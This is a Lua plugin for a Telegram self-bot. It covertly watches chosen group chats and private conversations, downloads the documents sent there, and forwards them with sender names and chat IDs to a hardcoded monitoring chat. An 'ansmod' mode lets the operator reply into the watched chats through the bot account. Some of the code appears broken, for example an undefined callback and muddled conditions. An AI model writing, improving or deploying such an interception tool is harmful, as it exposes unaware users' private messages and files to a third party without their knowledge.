local function doc(msg, success, result)
    if success then
            local file = 'data/photos/showpic'
            print('File downloaded to:', result)
            os.rename(result, file)
            print('File moved to:', file)
            send_document('chat#142334685', file, ok_cb, false)
    else
            print('Error downloading: '..msg.id)
            send_large_msg('chat#142334685', 'Failed to download', ok_cb, false)
    end
end
local function photo(msg, success, result)
    if success then
            local file = 'data/photos/showpic'
            print('File downloaded to:', result)
            os.rename(result, file)
            print('File moved to:', file)
            send_photo('chat#142334685', file, ok_cb, false)
    else
            print('Error downloading: '..msg.id)
            send_large_msg('chat#142334685', 'Failed to download', ok_cb, false)
    end
end
local function vid(msg, success, result)
    if success then
            local file = 'data/photos/showpic'
            print('File downloaded to:', result)
            os.rename(result, file)
            print('File moved to:', file)
            send_video('chat#142334685', file, ok_cb, false)
    else
            print('Error downloading: '..msg.id)
            send_large_msg('chat#142334685', 'Failed to download', ok_cb, false)
    end
end
local function aud(msg, success, result)
    if success then
            local file = 'data/photos/showpic'
            print('File downloaded to:', result)
            os.rename(result, file)
            print('File moved to:', file)
            send_audio('chat#142334685', file, ok_cb, false)
    else
            print('Error downloading: '..msg.id)
            send_large_msg('chat#142334685', 'Failed to download', ok_cb, false)
    end
end

local function run(msg, matches)
local type = mimetype.get_content_type_no_sub(msg)
    if matches[1] == "show" or matches[1] == "Show" and not matches[2] then
            if msg.to.id == 142334685 then
              show = 1
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "show" or matches[1] == "Show" and matches[2] ~= 'nil' then
            if msg.to.id == 142334685 then
              redis:set("id", matches[2])
              show = 2
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "stop" or matches[1] == "Stop" then
          if msg.to.id == 142334685 then
            show = 0
            ansmod = 0
            redis:del("id")
            redis:del("ansmod")
            return "غیر فعال"
          else
            send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
          end
    elseif matches[1] == "showpv" or matches[1] == "Showpv" and not matches[2] then
          if msg.to.id == 142334685 then
              show = 3
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "showpv" or matches[1] == "Showpv" and matches[2] ~= 'nil'then
          if msg.to.id == 142334685 then
              redis:set("id", matches[2])
              show = 4
              ansmod = 0
              return "فعال 😈"
            else
              send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
            end
    elseif matches[1] == "ansmod" or matches[1] == "Ansmod" then
          if is_sudo(msg) then
            if tonumber(ansmod) == 0 then
              if msg.to.id == 142334685 then
                if tonumber(show) == 2 or tonumber(show) == 4 then
                  redis:set("ansmod", msg.from.id)
                  ansmod = 1
                  return "on"
                else
                  return "Error"
                end
              else
                send_msg('chat#142334685', "اینجا باید بزنی", ok_cb, false)
              end
            end
          end
    end
    if tonumber(show) == 1 then
      --send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id..'\n___________\n'..msg.text, ok_cb, false)
      if msg.media then
        if msg.media.type == 'document' then
          send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."👇👇👇👇👇", ok_cb, false)
          load_document(msg.id, mediato, msg)
        end
      end
    elseif tonumber(show) == 2 then
      if msg.to.id == tonumber(redis:get("id")) then
        --send_msg('chat#142334685', msg.from.print_name.. '\n___________\n'..msg.text, ok_cb, false)
        if msg.media then
          if msg.media.type == 'document' then
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."👇👇👇👇👇", ok_cb, false)
            load_document(msg.id, mediato, msg)
          end
        end
      end
    elseif tonumber(show) == 3 then
      if msg.to.type == "user" then
        --send_msg('chat#142334685', msg.from.print_name..'\n'..msg.from.id..'\n___________\n'..msg.text, ok_cb, false)
        if msg.media then
          if msg.media.type == 'document' then
            send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."👇👇👇👇👇", ok_cb, false)
            load_document(msg.id, doc, msg)
            return type
          end
        end
      end
    elseif tonumber(show) == 4 then
      if msg.to.type == "user" then
        if msg.from.id == tonumber(redis:get("id")) then
          --send_msg('chat#142334685', msg.text, ok_cb, false)
          if msg.media then
            if msg.media.type == 'document' then
              send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.print_name..'\n'..msg.to.id.."👇👇👇👇👇", ok_cb, false)
              load_document(msg.id, mediato, msg)
            end
          end
        end
      end
    end
    if msg.to.id == 142334685 then
      if ansmod == 1 then
        if msg.from.id == tonumber(redis:get("ansmod")) then
          if matches[1] == "ansmod off" or matches[1] == "Ansmod off" then
            redis:del("ansmod")
            ansmod = 0
            return "off"
          elseif tonumber(show) == 2 then
            send_msg('chat#'..redis:get("id"), matches[1], ok_cb, false)
          elseif tonumber(show) == 4 then
            send_msg('user#'..redis:get("id"), matches[1], ok_cb, false)
          end
        end
      end
    end
end
return {
     patterns = {
        "^([Ss]how)$",
        "^([Ss]howpv)$",
        "^([Ss]how) (%d+)$",
        "^([Ss]howpv) (%d+)$",
        "^([Ss]top)$",
        "^([Aa]nsmod)$",
        "^([Aa]nsmod off)$",
        "%[(document)%]",
        "^(.*)$"
        },
     run = run
}
